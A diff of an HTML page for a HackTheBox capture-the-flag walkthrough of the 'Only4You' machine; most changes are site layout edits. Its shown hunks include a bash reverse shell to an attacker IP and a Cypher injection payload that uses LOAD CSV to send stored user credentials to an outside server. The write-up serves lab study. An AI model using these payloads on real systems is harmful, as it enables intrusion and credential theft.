@@ -1,16 +1,15 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Only4You - HTB</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <meta name="description" content="Artículos técnicos sobre ciberseguridad, Active Directory, Binary Exploitation y más">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
-    <link href="/css/articles.css" rel="stylesheet">
     <link href="/css/styles.css" rel="stylesheet">
+    <link href="/css/articles.css" rel="stylesheet">
     <link href="/css/monokai.css" rel="stylesheet">
-    <link href="/css/writeups.css" rel="stylesheet">
     <link rel="icon" href="/favicon.ico" type="image/x-icon">
 </head>
 <body>
@@ -18,36 +17,65 @@
     <div class="container-fluid">
         <div class="row">
             <!-- Sidebar -->
-            <aside class="sidebar">
+            <aside class="sidebar" id="sidebar">
                 <div class="sidebar-logo">
-                    <img src="/img/new-logo.png" alt="Logo">
+                    <img src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
                     <h3>elswix</h3>
                 </div>
                 <nav>
-                    <ul class="nav flex-column">
-                        <li class="nav-item"><a href="/" class="nav-link active"><i class="bi bi-house-door"></i> Home</a></li>
-                        <li class="nav-item"><a href="/articles" class="nav-link"><i class="bi bi-card-text"></i> Articles</a></li>
-                        <li class="nav-item"><a href="/writeups" class="nav-link"><i class="bi bi-terminal"></i> WriteUPs</a></li>
-                        <li class="nav-item"><a href="/notes" class="nav-link"><i class="bi bi-journal-text"></i> Notes</a></li>
-                        <li class="nav-item"><a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link"><i class="bi bi-github"></i> KL-Sunset</a></li>
-                        <li class="nav-item"><a href="/about" class="nav-link"><i class="bi bi-person"></i> About me</a></li>
+                    <ul class="nav-menu">   
+                        <li class="nav-item">
+                            <a href="/" class="nav-link">
+                                <i>🏠</i>
+                                <span>Home</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/articles" class="nav-link active">
+                                <i>📝</i>
+                                <span>Articles</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/writeups" class="nav-link">
+                                <i>💻</i>
+                                <span>WriteUps</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/notes" class="nav-link">
+                                <i>📚</i>
+                                <span>Notes</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link">
+                                <i>⚡</i>
+                                <span>KL-Sunset</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/about" class="nav-link">
+                                <i>👤</i>
+                                <span>About me</span>
+                            </a>
+                        </li>
                     </ul>
                 </nav>
             </aside>
+
             <!-- Main Content -->
             <main>
                 <!-- Hero Section -->
                 <section class="hero mb-5">
-                    <img alt="index-logo" class="mb-3" style="width: 120px; height: 120px; border-radius: 50%" src="/writeups/htb/medium/only4you/img/only4you.png">
-                <h2>Only4You - HTB</h2>
-                <p>walkthrough by elswix<p>
-                <ul class="machine-links" style="display: none">
-                    <li><a href="https://app.hackthebox.com/machines/Only4You">HackTheBox</a></li>
-                </ul>
-            </section>
+                    <img src="/writeups/htb/medium/only4you/img/only4you.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=📝'">
+                    <h2>Only4You - HTB</h2>
+                    <p>walkthrough by elswixHackTheBox</p>
+                </section>
+
                 <section class="article-content">
-                    <div class="article-container">
-                        <div class="article-content-main">                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">OnlyForYou</span>
+<div class="article-container">
+<div class="article-content-main"> <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">OnlyForYou</span>
 <span class="k">Difficulty</span><span class="p">:</span> <span class="n">Medium</span>
 <span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
 <span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">04</span><span class="o">/</span><span class="mi">22</span><span class="o">/</span><span class="mi">2023</span>
@@ -99,8 +127,8 @@ Once again, we will use the <code>nmap</code> tool:<br/><br/>
 <span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
 <span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">20.49</span> <span class="n">seconds</span>
 </pre></div>
-<h3><br>Web Reconnaissance:</br></h3><br>
-After the scan, we can see that when accessing the website using the IP address, it redirects us to a domain: only4you.htb.<br/><br/>
+<h3><br/>Web Reconnaissance:</h3><br/>
+After the scan, we can see that when accessing the website using the IP address, it redirects us to a domain: only4you.htb.<br><br/>
 The issue is that during the redirection, our request does not know what that domain is. To avoid this problem, we will add the domain to the /etc/hosts file.<br/><br/>
 <div class="highlight"><pre><span></span><span class="c1"># Host addresses</span>
 <span class="mf">127.0.0.1</span>  <span class="n">localhost</span>
@@ -118,9 +146,9 @@ With this done, we will begin recognizing the technologies used by the website f
 
 We don't see anything particularly interesting at the moment; we can only highlight an email address.<br/><br/>
 On the web front, we have the following:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/2.png"/><br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/2.png"><br/><br/>
 <a href="https://www.wappalyzer.com/">Wappalyzer</a> shows us the following:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/3.png"/><br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/3.png"><br/><br/>
 There isn't anything interesting here either.<br/><br/>
 If we browse through the website a bit, there's a "Frequently Asked Questions" section in which there's one in particular that provides us with relevant information:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/4.png"/><br/><br/>
@@ -246,8 +274,8 @@ First, we put ourselves in listening mode from our machine using tcpdump:<br/><b
 And we send the request:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/14.png"/><br/><br/>
 As we can see, we have received the trace, and we have achieved remote command execution (RCE).<br/><br/>
-<h3><br>Shell as www-data</br></h3><br>
-With that done, now we will attempt to send a TCP Reverse Shell to our attacker machine. To do this, we will create an <code>index.html</code> file in which we will store a malicious payload written in bash that sends us a Reverse Shell.<br/><br/>
+<h3><br/>Shell as www-data</h3><br/>
+With that done, now we will attempt to send a TCP Reverse Shell to our attacker machine. To do this, we will create an <code>index.html</code> file in which we will store a malicious payload written in bash that sends us a Reverse Shell.<br><br/>
 <div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
 <span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">10.10.16.4</span><span class="o">/</span><span class="mi">443</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
 </pre></div>
@@ -297,8 +325,8 @@ Before we finish, let's export the TERM to enable the use of CTRL+L:<br/><br/>
 </pre></div>
 
 Finally, we now have a more interactive tty to work more comfortably.<br/><br/>
-<h3><br>Privilege Escalation to john:</br></h3><br>
-After a bit of enumeration, we can see that port 8001 is open, and I believe it's a web service.<br/><br/>
+<h3><br/>Privilege Escalation to john:</h3><br/>
+After a bit of enumeration, we can see that port 8001 is open, and I believe it's a web service.<br><br/>
 <div class="highlight"><pre><span></span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@only4you</span><span class="err">$</span> <span class="n">ss</span> <span class="o">-</span><span class="n">nltp</span>
 <span class="n">State</span>   <span class="n">Recv</span><span class="o">-</span><span class="n">Q</span>  <span class="n">Send</span><span class="o">-</span><span class="n">Q</span>        <span class="n">Local</span> <span class="n">Address</span><span class="p">:</span><span class="n">Port</span>    <span class="n">Peer</span> <span class="n">Address</span><span class="p">:</span><span class="n">Port</span>  <span class="n">Process</span>                                                   
 <span class="n">LISTEN</span>  <span class="mi">0</span>       <span class="mi">4096</span>          <span class="mf">127.0.0.53</span><span class="o">%</span><span class="n">lo</span><span class="p">:</span><span class="mi">53</span>           <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>                                                               
@@ -357,8 +385,8 @@ If we enter a character, for example, "a," we can see that the content of the pa
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/20.png"/><br/><br/>
 At first glance, it appears that there is a database query running in the background that filters the information based on what we provide in the search box.<br/><br/>
 This could be critical if implemented improperly, as entering a malicious payload could lead to a SQL Injection vulnerability.<br/><br/>
-<h3><br>Cypher Injection:</br></h3><br>
-To test this, we will enter a single quote in the search box:<br/><br/>
+<h3><br/>Cypher Injection:</h3><br/>
+To test this, we will enter a single quote in the search box:<br><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/21.png"/><br/><br/>
 We can see that an error has occurred as indicated by the status code 500.<br/><br/>
 I would like to assume that the search box uses a Neo4j database, so if we search the internet for ways to exploit Neo4j, we come across Cypher Injection.<br/><br/>
@@ -381,8 +409,8 @@ In this case, we will enumerate the labels the server has, modifying the previou
 We send the request and receive the following on our server:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/26.png"/><br/><br/>
 We can see that we receive the names of the labels, and one of them is "user," which is interesting because it might contain stored credentials.<br/><br/>
-<h3><br>Shell as john:</br></h3><br>
-By reading further in HackTricks, we can see that we can obtain the properties of a key:<br/><br/>
+<h3><br/>Shell as john:</h3><br/>
+By reading further in HackTricks, we can see that we can obtain the properties of a key:<br><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/27.png"/><br/><br/>
 We will try to modify the payload slightly, adapting our values (don't forget the single quotation mark at the beginning):<br/><br/>
 <div class="highlight"><pre><span></span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">MATCH</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">:</span><span class="k">user</span><span class="p">)</span><span class="w"> </span><span class="n">UNWIND</span><span class="w"> </span><span class="n">keys</span><span class="p">(</span><span class="n">u</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="k">LOAD</span><span class="w"> </span><span class="n">CSV</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="s1">'http://10.10.16.4:8000/?'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">+</span><span class="s1">'='</span><span class="o">+</span><span class="n">toString</span><span class="p">(</span><span class="n">u</span><span class="p">[</span><span class="n">p</span><span class="p">])</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">l</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">_0</span><span class="w"> </span><span class="o">//</span>
@@ -465,15 +493,17 @@ We become root by running the <code>bash -p</code> command, taking advantage of 
 Finally, we get the last flag:<br/><br/>
 <div class="highlight"><pre><span></span><span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="root1">#</span><span class="n"> cat /root/root.txt</span>
 <span class="mi">8</span><span class="n">c60f13f</span><span class="o">*************</span><span class="n">e56f3664496</span>
-</pre></div></br></br></br></br></br>
-            </div>
+</pre></div></br></br></br></br></img></img></br>
+</div>
+</div>
+</section>
+<script src="/js/sidebarToggle.js"></script>
+<script src="/js/fixMobileImages.js"></script>
+<footer>
+<p>© 2024 elswix.github.io</p>
+</footer>
+            </main>
         </div>
-    </section>
-
-    <script src="/js/sidebarToggle.js"></script>
-    <script src="/js/fixMobileImages.js"></script>
-    <footer>
-        <p>&copy; 2024 elswix.github.io</p>
-    </footer>
+    </div>
 </body>
 </html>
